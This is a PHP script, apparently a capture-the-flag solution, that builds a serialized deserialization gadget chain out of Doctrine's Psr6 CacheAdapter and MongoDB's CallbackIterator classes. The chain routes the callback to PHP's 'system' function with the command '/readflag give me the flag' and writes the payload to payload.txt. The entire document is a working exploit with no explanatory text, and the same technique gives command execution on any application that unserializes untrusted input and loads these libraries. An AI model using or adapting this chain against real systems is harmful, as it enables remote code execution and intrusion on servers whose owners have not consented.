<?php
namespace Doctrine\Common\Cache\Psr6
{
    class CacheAdapter
    {
        public $deferredItems = true;
    }
    class TypedCacheItem
    {
        public $expiry = 99999999999999999;
        public $key = 'id'; // This will be used as $key in commit()
        public $value = '';
    }
}


namespace MongoDB\Model
{
    use Iterator;

    class CallbackIterator implements Iterator
    {
        public $callback;
        public $iterator;

        public function __construct($traversable, $callback)
        {
            $this->iterator = $traversable;
            $this->callback = $callback;
        }

        public function current()
        {
            return call_user_func($this->callback, $this->iterator->current(), $this->iterator->key());
        }

        public function key()
        {
            return $this->iterator->key();
        }

        public function next()
        {
            $this->iterator->next();
        }

        public function rewind()
        {
            $this->iterator->rewind();
        }

        public function valid()
        {
            return $this->iterator->valid();
        }
    }
}

namespace PopChain
{
    use Doctrine\Common\Cache\Psr6\CacheAdapter;
    use MongoDB\Model\CallbackIterator;

    $innerIterator = new \ArrayIterator(['dummy' => '/readflag give me the flag']);

    $callback = 'system';

    $callbackIterator = new CallbackIterator($innerIterator, $callback);

    $adapter = new CacheAdapter();
    $adapter->deferredItems = $callbackIterator;

    $ses = serialize($adapter);
    file_put_contents("./payload.txt", $ses);
    echo $ses;
}
?>
